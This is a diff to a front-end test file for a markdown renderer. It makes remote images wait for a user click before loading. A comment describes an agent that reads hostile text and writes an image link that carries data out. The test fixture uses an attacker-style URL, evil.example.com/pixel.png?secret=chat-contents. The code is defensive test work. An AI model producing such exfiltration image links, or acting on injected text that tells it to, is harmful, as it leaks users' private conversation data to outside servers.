@@ -270,22 +270,45 @@ describe('MarkdownText', () => {
     expect(screen.getByRole('button', { name: 'Copy code' })).toBeTruthy()
   })
 
-  it('renders absolute HTTP(S) images with bounded presentation', () => {
+  it('asks no server for a remote image until the person clicks, then loads it with bounded presentation', () => {
+    // The replay: an agent that read hostile text writes an image whose address
+    // carries data out. Rendering the reply must not fetch it.
     const markdown = [
-      '![secure diagram](https://example.com/secure.png)',
+      '![secure diagram](https://evil.example.com/pixel.png?secret=chat-contents)',
       '![plain diagram](http://example.com/plain.png)',
     ].join('\n\n')
     const { container } = render(<MarkdownText text={markdown} />)
-    const images = [...container.querySelectorAll('img')]
-    expect(images.map(image => image.getAttribute('src'))).toEqual([
-      'https://example.com/secure.png',
-      'http://example.com/plain.png',
+    expect(container.querySelector('img')).toBeNull()
+    const buttons = [...container.querySelectorAll<HTMLButtonElement>('[data-remote-image]')]
+    expect(buttons.map(button => button.textContent)).toEqual([
+      'secure diagram · Load image from evil.example.com',
+      'plain diagram · Load image from example.com',
     ])
+
+    fireEvent.click(buttons[0]!)
+    const images = [...container.querySelectorAll('img')]
+    expect(images.map(image => image.getAttribute('src'))).toEqual(['https://evil.example.com/pixel.png?secret=chat-contents'])
     for (const image of images) {
       expect(image.getAttribute('loading')).toBe('lazy')
       expect(image.getAttribute('decoding')).toBe('async')
       expect(image.getAttribute('referrerpolicy')).toBe('no-referrer')
     }
+    // The other image is still waiting.
+    expect(container.querySelectorAll('[data-remote-image]')).toHaveLength(1)
+  })
+
+  it('remembers a chosen image when the reply renders again', () => {
+    const markdown = '![again](https://example.com/chosen-once.png)'
+    const first = render(<MarkdownText text={markdown} />)
+    fireEvent.click(first.container.querySelector('[data-remote-image]')!)
+    first.unmount()
+    const second = render(<MarkdownText text={markdown} />)
+    expect(second.container.querySelector('img')?.getAttribute('src')).toBe('https://example.com/chosen-once.png')
+  })
+
+  it('uses the words it is given', () => {
+    const { container } = render(<MarkdownText text="![](https://example.com/worded.png)" codeLabels={{ loadImageLabel: '从 {host} 加载图片' }} />)
+    expect(container.querySelector('[data-remote-image]')?.textContent).toBe('从 example.com 加载图片')
   })
 
   it('neutralizes raw HTML, unsafe or relative links, and unsupported images', () => {
